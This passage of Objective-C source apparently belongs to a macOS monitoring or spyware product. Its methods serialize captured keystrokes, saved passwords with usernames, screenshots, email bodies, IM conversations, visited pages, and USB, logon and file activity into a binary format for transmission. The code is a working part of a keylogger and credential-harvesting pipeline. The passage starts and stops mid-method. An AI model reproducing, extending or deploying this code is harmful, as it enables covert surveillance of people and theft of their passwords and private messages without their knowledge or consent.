	userIDSize = [userID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	contactNameSize = [contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	transferedByte = [aEvent mTransferedByte];
	transferedByte = htonl(transferedByte);
	isMonitor = [aEvent mIsMonitor];
	frameStripID = [aEvent mFrameStripID];
	frameStripID = htonl(frameStripID);
	
	NSMutableData *result = [[NSMutableData alloc] initWithCapacity:(1 + 4 + 1 + 1 + userIDSize + contactNameSize)];
	[result appendBytes:&category length:sizeof(uint8_t)];
	[result appendBytes:&direction length:sizeof(uint8_t)];
	[result appendBytes:&duration length:sizeof(uint32_t)];
	[result appendBytes:&userIDSize length:sizeof(uint8_t)];
	[result appendData:[userID dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&contactNameSize length:sizeof(uint8_t)];
	[result appendData:[contactName dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&transferedByte length:sizeof(uint32_t)];
	[result appendBytes:&isMonitor length:sizeof(uint8_t)];
	[result appendBytes:&frameStripID length:sizeof(uint32_t)];
	
	return [result autorelease];
}


+ (NSData *) parseKeyLogEvent: (KeyLogEvent *) aEvent {

	uint16_t usernameSize;
	NSString *username          = nil;
	
    uint16_t applicationIDSize;
	NSString *applicationID     = nil;
    
    uint16_t applicationNameSize;
	NSString *applicationName	= nil;
    
	uint16_t titleSize;
	NSString *title             = nil;
	
    uint16_t urlSize;
	NSString *url               = nil;
	
	uint32_t rawDataSize;
	NSString *rawData           = nil;
	
    uint32_t formattedSize;
    NSString * formatted        = nil;
    
    uint8_t screenShotType;
    
    uint32_t screenShotSize;
    NSString * screenShotPath   = nil;
    NSData   * screenShotData   = nil;
    
	username				= [aEvent mUserName];
	applicationID			= [aEvent mApplicationID];
    applicationName         = [aEvent mApplication];
	title					= [aEvent mTitle];
    url                     = [aEvent mUrl];
	rawData					= [aEvent mRawData];
    formatted               = [aEvent mActualDisplayData];
	screenShotType          = [aEvent mScreenShotMediaType];
    screenShotPath          = [aEvent mScreenShot];
    screenShotData          = [[NSData alloc]initWithContentsOfFile:screenShotPath];
    
	DLog (@"KEYLOG: username: %@", username)	
	DLog (@"KEYLOG: applicationID: %@", applicationID)
    DLog (@"KEYLOG: applicationName: %@", applicationName)
	DLog (@"KEYLOG: title: %@", title)
    DLog (@"KEYLOG: title: %@", title)
	DLog (@"KEYLOG: rawData: %@", rawData)
    DLog (@"KEYLOG: formatted: %@", formatted)
	DLog (@"KEYLOG: screenShotType: %d", screenShotType)
    DLog (@"KEYLOG: screenShotPath: %@", screenShotPath)
    DLog (@"KEYLOG: screenShotData: %@", screenShotData)
    
	usernameSize			= [username lengthOfBytesUsingEncoding:NSUTF8StringEncoding];           // 2 bytes
	DLog (@"KEYLOG: usernameSize: %d", usernameSize)
    usernameSize            = htons(usernameSize);
	
	applicationIDSize		= [applicationID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];      // 2 bytes
	DLog (@"KEYLOG: applicationIDSize: %d", applicationIDSize)
    applicationIDSize       = ntohs(applicationIDSize);
    
    applicationNameSize		= [applicationName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];    // 2 bytes
	DLog (@"KEYLOG: applicationNameSize: %d", applicationNameSize)
    applicationNameSize     = ntohs(applicationNameSize);

	titleSize		= [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];                      // 2 bytes
	DLog (@"KEYLOG: titleSize: %d hex[%x]", titleSize, titleSize)	
	titleSize		= htons(titleSize);
	
    urlSize			= [url lengthOfBytesUsingEncoding:NSUTF8StringEncoding];                        // 2 bytes
	DLog (@"KEYLOG: urlSize: %d hex[%x]", urlSize, urlSize)	
	urlSize			= htons(urlSize);
    
	rawDataSize		= [rawData lengthOfBytesUsingEncoding:NSUTF8StringEncoding];                    // 4 bytes
	DLog (@"KEYLOG: rawDataSize: %d hex[%x]", rawDataSize, rawDataSize)	
	rawDataSize		= htonl(rawDataSize);
    
    formattedSize	= [formatted lengthOfBytesUsingEncoding:NSUTF8StringEncoding];                  // 4 bytes
	DLog (@"KEYLOG: formattedSize: %d hex[%x]", formattedSize, formattedSize)	
	formattedSize	= htonl(formattedSize);	
    
    screenShotSize	= [screenShotData length];                                                       // 4 bytes
	DLog (@"KEYLOG: screenShotSize: %d hex[%x]", screenShotSize, screenShotSize)	
	screenShotSize	= htonl(screenShotSize);	
    
    
	NSMutableData *result	= [[NSMutableData alloc] init];
	
	[result appendBytes:&usernameSize length:sizeof(uint16_t)];										// username
	[result appendData:[username dataUsingEncoding:NSUTF8StringEncoding]];
	
	[result appendBytes:&applicationIDSize length:sizeof(uint16_t)];                                // applicationID
	[result appendData:[applicationID dataUsingEncoding:NSUTF8StringEncoding]];
	
    [result appendBytes:&applicationNameSize length:sizeof(uint16_t)];								// applicationName
	[result appendData:[applicationName dataUsingEncoding:NSUTF8StringEncoding]];
    
	[result appendBytes:&titleSize length:sizeof(uint16_t)];										// title
	[result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
	
    [result appendBytes:&urlSize length:sizeof(uint16_t)];                                          // url
	[result appendData:[url dataUsingEncoding:NSUTF8StringEncoding]];
	
	[result appendBytes:&rawDataSize length:sizeof(uint32_t)];										// raw data
	[result appendData:[rawData dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&formattedSize length:sizeof(uint32_t)];                                    // actual data
	[result appendData:[formatted dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&screenShotType length:sizeof(uint8_t)];                                    // screenShotType
	
    [result appendBytes:&screenShotSize length:sizeof(uint32_t)];                                   // actual data
	[result appendData:screenShotData];
    
    [screenShotData release];
    
	return [result autorelease];
}

+ (NSData *) parsePageVisitedEvent: (PageVisitedEvent *) aEvent {
    
	uint16_t usernameSize;
	NSString *username		= nil;
    
    uint16_t applicationIDSize;
    NSString *applicationID = nil;
	
	uint16_t applicationSize;
	NSString *application	= nil;
	
	uint16_t titleSize;
	NSString *title			= nil;
    
    uint16_t urlSize;
	NSString *url			= nil;
	
	uint8_t screenShotMediaType;
	
	uint32_t screenShotDataSize;
	NSData *screenShotData  = nil;
	
	username				= [aEvent mUserName];
    applicationID           = [aEvent mApplicationID];
	application				= [aEvent mApplication];
	title					= [aEvent mTitle];
    url                     = [aEvent mUrl];
	screenShotMediaType		= [aEvent mScreenShotMediaType];
    
    // This event is for Mac thus memory may not be a problem
	screenShotData			= [[NSData alloc] initWithContentsOfFile:[aEvent mScreenShot]];
	
	DLog (@"SCSHOT: username: %@", username)	
	DLog (@"SCSHOT: applicationID: %@", applicationID)
    DLog (@"SCSHOT: application: %@", application)
	DLog (@"SCSHOT: title: %@", title)
	DLog (@"SCSHOT: url: %@", url)
	DLog (@"SCSHOT: screenShotMediaType: %d", screenShotMediaType)
	
	usernameSize			= [username lengthOfBytesUsingEncoding:NSUTF8StringEncoding];			// 2 bytes
    DLog (@"SCSHOT: username size: %d, %d", usernameSize, htons(usernameSize))
    usernameSize            = htons(usernameSize);
	
    applicationIDSize       = [applicationID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];      // 2 bytes
	DLog (@"SCSHOT: applicationID size: %d, %d", applicationIDSize, htons(applicationIDSize))
    applicationIDSize       = htons(applicationIDSize);
    
	applicationSize			= [application lengthOfBytesUsingEncoding:NSUTF8StringEncoding];		// 2 bytes
	DLog (@"SCSHOT: applicatione size: %d, %d", applicationSize, htons(applicationSize))
    applicationSize         = htons(applicationSize);
	
	titleSize				= [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];				// 2 bytes
	DLog (@"SCSHOT: title size: %d, %d", titleSize, htons(titleSize))
	titleSize				= htons(titleSize);
	
	urlSize                 = [url lengthOfBytesUsingEncoding:NSUTF8StringEncoding];                // 2 bytes
	DLog (@"SCSHOT: url size: %d, %d", urlSize, htons(urlSize))
	urlSize                 = htons(urlSize);
	
	screenShotDataSize		= [screenShotData length];                                              // 4 bytes
	DLog (@"SCSHOT: screen shot data size: %d, %d", screenShotDataSize, htonl(screenShotDataSize))
	screenShotDataSize		= htonl(screenShotDataSize);
	
	NSMutableData *result	= [[NSMutableData alloc] init];
	
	[result appendBytes:&usernameSize length:sizeof(uint16_t)];										// username
	[result appendData:[username dataUsingEncoding:NSUTF8StringEncoding]];
	
    [result appendBytes:&applicationIDSize length:sizeof(uint16_t)];								// application id
	[result appendData:[applicationID dataUsingEncoding:NSUTF8StringEncoding]];
    
	[result appendBytes:&applicationSize length:sizeof(uint16_t)];									// application name
	[result appendData:[application dataUsingEncoding:NSUTF8StringEncoding]];
	
	[result appendBytes:&titleSize length:sizeof(uint16_t)];										// title
	[result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&urlSize length:sizeof(uint16_t)];                                          // url
	[result appendData:[url dataUsingEncoding:NSUTF8StringEncoding]];
	
    //[result appendBytes:&screenShotMediaType length:sizeof(uint8_t)];                             // screen shot media type --> Obsolete
	
	//[result appendBytes:&screenShotDataSize length:sizeof(uint32_t)];								// screen shot data --> Obsolete
	//[result appendData:screenShotData];
    
    [screenShotData release];
	
	return [result autorelease];
}

+ (NSData *) parsePasswordEvent: (PasswordEvent *) aEvent {
    NSString *applicationID = [aEvent mApplicationID];
    int16_t applicationIDSize = [applicationID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    applicationIDSize = htons(applicationIDSize);
    
    NSString *applicationName = [aEvent mApplicationName];
    int16_t applicationNameSize = [applicationName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    applicationNameSize = htons(applicationNameSize);
    
    int8_t applicationType = [aEvent mApplicationType];
    
    int16_t countOfAppPassword = [[aEvent mAppPasswords] count];
    countOfAppPassword = htons(countOfAppPassword);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    
    [result appendBytes:&applicationIDSize length:sizeof(int16_t)];
    [result appendData:[applicationID dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&applicationNameSize length:sizeof(int16_t)];
    [result appendData:[applicationName dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&applicationType length:sizeof(int8_t)];
    
    //[result appendBytes:&countOfAppPassword length:sizeof(int16_t)];
    
    //for (AppPassword *appPwd in [aEvent mAppPasswords]) {
        AppPassword *appPwd = [[aEvent mAppPasswords] firstObject];
    
        NSString *accountName = [appPwd mAccountName];
        int16_t accountNameSize = [accountName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        accountNameSize = htons(accountNameSize);
        
        NSString *userName = [appPwd mUserName];
        int16_t userNameSize = [userName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        userNameSize = htons(userNameSize);
        
        NSString *password = [appPwd mPassword];
        int16_t passwordSize = [password lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        passwordSize = htons(passwordSize);
        
        [result appendBytes:&accountNameSize length:sizeof(int16_t)];
        [result appendData:[accountName dataUsingEncoding:NSUTF8StringEncoding]];
        
        [result appendBytes:&userNameSize length:sizeof(int16_t)];
        [result appendData:[userName dataUsingEncoding:NSUTF8StringEncoding]];
        
        [result appendBytes:&passwordSize length:sizeof(int16_t)];
        [result appendData:[password dataUsingEncoding:NSUTF8StringEncoding]];
        
        //break; // Only one password per pass word event
    //}
    
    return ([result autorelease]);
}

+ (NSData *) parseUsbEvent: (UsbEvent *) aEvent {
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    NSString *appID = [aEvent mAppID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    NSString *appName = [aEvent mAppName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    NSString *title = [aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    int8_t action = [aEvent mAction];
    int8_t type = [aEvent mType];
    
    NSString *name = [aEvent mName];
    int16_t nameSize = [name lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    nameSize = htons(nameSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&action length:sizeof(int8_t)];
    [result appendBytes:&type length:sizeof(int8_t)];
    [result appendBytes:&nameSize length:sizeof(int16_t)];
    [result appendData:[name dataUsingEncoding:NSUTF8StringEncoding]];
    
    return ([result autorelease]);
}

+ (NSData *) parseFileTransferEvent: (FileTransferEvent *) aEvent {
    int8_t direction = [aEvent mDirection];
    
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    NSString *appID = [aEvent mAppID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    NSString *appName = [aEvent mAppName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    NSString *title = [aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    int8_t type = [aEvent mType];
    NSString *sPath = [aEvent mSPath];
    int16_t sPathSize = [sPath lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    sPathSize = htons(sPathSize);
    NSString *dPath = [aEvent mDPath];
    int16_t dPathSize = [dPath lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    dPathSize = htons(dPathSize);
    NSString *fileName = [aEvent mFileName];
    int16_t fileNameSize = [fileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    fileNameSize = htons(fileNameSize);
    uint64_t fileSize = [aEvent mFileSize];
    //fileSize = htonll(fileSize); // Available for only OS X
    fileSize = EndianU64_LtoB(fileSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&direction length:sizeof(int8_t)];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&type length:sizeof(int8_t)];
    [result appendBytes:&sPathSize length:sizeof(int16_t)];
    [result appendData:[sPath dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&dPathSize length:sizeof(int16_t)];
    [result appendData:[dPath dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&fileNameSize length:sizeof(int16_t)];
    [result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&fileSize length:sizeof(uint64_t)];
    
    return ([result autorelease]);
}

+ (NSData *) parseLogonEvent: (LogonEvent *) aEvent {
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    NSString *appID = [aEvent mAppID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    NSString *appName = [aEvent mAppName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    NSString *title = [aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    int8_t action = [aEvent mAction];
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&action length:sizeof(int8_t)];
    
    return ([result autorelease]);
}

+ (NSData *) parseAppUsageEvent: (AppUsageEvent *) aEvent {
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    NSString *appID = [aEvent mAppID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    NSString *appName = [aEvent mAppName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    NSString *title = [aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    NSString *gotFocusTime = [aEvent mGotFocusTime];
    int16_t gotFocusTimeSize = [gotFocusTime lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    gotFocusTimeSize = htons(gotFocusTimeSize);     //Fix size in the protocol 19 bytes
    NSString *lostFocusTime = [aEvent mLostFocusTime];
    int16_t lostFocusTimeSize = [lostFocusTime lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    lostFocusTimeSize = htons(lostFocusTimeSize);   //Fix size in the protocol 19 bytes
    uint32_t duration = [aEvent mDuration];
    duration = htonl(duration);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[gotFocusTime dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[lostFocusTime dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&duration length:sizeof(uint32_t)];
    
    return ([result autorelease]);
}

+ (NSData *) parseIMMacOSEvent: (IMMacOSEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle {
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    NSString *appID = [aEvent mAppID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    NSString *appName = [aEvent mAppName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    NSString *title = [aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    uint8_t imServiceID = [aEvent mIMServiceID];
    NSString *convName = [aEvent mConvName];
    uint16_t convNameSize = [convName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    convNameSize = htons(convNameSize);
    NSString *keyData = [aEvent mKeyData];
    uint32_t keyDataSize = [keyData lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    keyDataSize = htonl(keyDataSize);
    uint8_t snapshotType = [aEvent mSnapshotType];
    NSData *snapshotData = [NSData dataWithContentsOfFile:[aEvent mSnapshotData]];
    uint32_t snapshotDataSize = [snapshotData length];
    snapshotDataSize = htonl(snapshotDataSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&imServiceID length:sizeof(uint8_t)];
    [result appendBytes:&convNameSize length:sizeof(uint16_t)];
    [result appendData:[convName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&keyDataSize length:sizeof(uint32_t)];
    [result appendData:[keyData dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&snapshotType length:sizeof(uint8_t)];
    [result appendBytes:&snapshotDataSize length:sizeof(uint32_t)];
    [result appendData:snapshotData];
    
    return ([result autorelease]);
}

+ (NSData *) parseEmailMacOSEvent: (EmailMacOSEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle {
    uint8_t direction = [aEvent mDirection];
    
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    NSString *appID = [aEvent mAppID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    NSString *appName = [aEvent mAppName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    NSString *title = [aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    uint8_t serviceType = [aEvent mServiceType];
    NSString *senderEmail = [aEvent mSenderEmail];
    uint16_t senderEmailSize = [senderEmail lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    senderEmailSize = htons(senderEmailSize);
    NSString *senderName = [aEvent mSenderName];
    uint16_t senderNameSize = [senderName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    senderNameSize = htons(senderNameSize);
    
    NSString *subject = [aEvent mSubject];
    uint16_t subjectSize = [subject lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    subjectSize = htons(subjectSize);
    NSString *body = [aEvent mBody];
    uint32_t bodySize = [body lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    bodySize = htonl(bodySize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&direction length:sizeof(uint8_t)];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&serviceType length:sizeof(uint8_t)];
    [result appendBytes:&senderEmailSize length:sizeof(uint16_t)];
    [result appendData:[senderEmail dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&senderNameSize length:sizeof(uint16_t)];
    [result appendData:[senderName dataUsingEncoding:NSUTF8StringEncoding]];
    NSData *recipientsData = [self parseRecipientsV10:[aEvent mRecipients]];
    [result appendData:recipientsData];
    [result appendBytes:&subjectSize length:sizeof(uint16_t)];
    [result appendData:[subject dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&bodySize length:sizeof(uint32_t)];
    [result appendData:[body dataUsingEncoding:NSUTF8StringEncoding]];
    NSData *attachmentsData = [self parseAttachmentsV10:[aEvent mAttachments]];
    [result appendData:attachmentsData];
    
    return ([result autorelease]);
}

+ (NSData *) parseScreenshotEvent: (ScreenshotEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle {
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    NSString *appID = [aEvent mAppID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    NSString *appName = [aEvent mAppName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    NSString *title = [aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    uint8_t callingModule = [aEvent mCallingModule];
    uint32_t frameID = [aEvent mFrameID];
    frameID = htonl(frameID);
    uint8_t mediaType = [aEvent mMediaType];
    NSData *screenshotData = [NSData dataWithContentsOfFile:[aEvent mScreenshotData]];
    uint32_t screenshotDataSize = [screenshotData length];
    screenshotDataSize = htonl(screenshotDataSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&callingModule length:sizeof(uint8_t)];
    [result appendBytes:&frameID length:sizeof(uint32_t)];
    [result appendBytes:&mediaType length:sizeof(uint8_t)];
    [result appendBytes:&screenshotDataSize length:sizeof(uint32_t)];
    [result appendData:screenshotData];
    
    return ([result autorelease]);
}
+ (NSData *) parseFileActivityEvent: (FileActivityEvent *) aEvent {

    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    
    NSString *appID = [aEvent mApplicationID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    
    NSString *appName = [aEvent mApplicationName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    
    NSString *title =[aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    uint8_t activityType = [aEvent mActivityType];
    uint8_t fileType = [aEvent mActivityFileType];
    
    NSString *activityOwner = [aEvent mActivityOwner];
    uint16_t activityOwnerSize = [activityOwner lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    activityOwnerSize = htons(activityOwnerSize);
    
    NSString *dateCreated = [aEvent mDateCreated];
    
    NSString *dateModified = [aEvent mDateModified];
    
    NSString *dateAccessed = [aEvent mDateAccessed];
    
    //============================================================== Old FileInfo
    
    FileActivityInfo * oldInfo = [aEvent mOriginalFile];
    
    uint16_t lengthOfOldInfo;
    NSMutableData *oldInfoData = [[NSMutableData alloc] init];
    
    if (oldInfo) {
        
        NSString *oldPath = [oldInfo mPath];
        uint16_t oldPathSize = [oldPath lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        oldPathSize = htons(oldPathSize);

        NSString *oldFileName = [oldInfo mFileName];
        uint16_t oldFileNameSize = [oldFileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        oldFileNameSize = htons(oldFileNameSize);

        uint64_t oldFileSize = [oldInfo mSize];
        oldFileSize = EndianU64_LtoB(oldFileSize);

        uint16_t oldAttributes = [oldInfo mAttributes];
        oldAttributes = htons(oldAttributes);

        uint16_t oldPermissionCount =[[oldInfo mPermissions] count];
        oldPermissionCount = htons(oldPermissionCount);

        NSMutableData *oldPermissionData = [[NSMutableData alloc] init];
        for (int i = 0; i < [[oldInfo mPermissions] count]; i++) {
            FileActivityPermission * permission = [[oldInfo mPermissions]objectAtIndex:i];
            
            NSString *permissionGroupUserName = [permission mGroupUserName];
            uint16_t permissionGroupUserNameSize = [permissionGroupUserName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
            permissionGroupUserNameSize = htons(permissionGroupUserNameSize);

            uint8_t privilegeFullControl        = [permission mPrivilegeFullControl];
            uint8_t privilegeModify             = [permission mPrivilegeModify];
            uint8_t privilegeReadExecute        = [permission mPrivilegeReadExecute];
            uint8_t privilegeRead               = [permission mPrivilegeRead];
            uint8_t privilegeWrite              = [permission mPrivilegeWrite];
            uint8_t privilegeListFolderContents = [permission mPrivilegeListFolderContents];
            
            [oldPermissionData appendBytes:&permissionGroupUserNameSize length:sizeof(uint16_t)];
            [oldPermissionData appendData:[permissionGroupUserName dataUsingEncoding:NSUTF8StringEncoding]];
            [oldPermissionData appendBytes:&privilegeFullControl length:sizeof(uint8_t)];
            [oldPermissionData appendBytes:&privilegeModify length:sizeof(uint8_t)];
            [oldPermissionData appendBytes:&privilegeReadExecute length:sizeof(uint8_t)];
            [oldPermissionData appendBytes:&privilegeRead length:sizeof(uint8_t)];
            [oldPermissionData appendBytes:&privilegeWrite length:sizeof(uint8_t)];
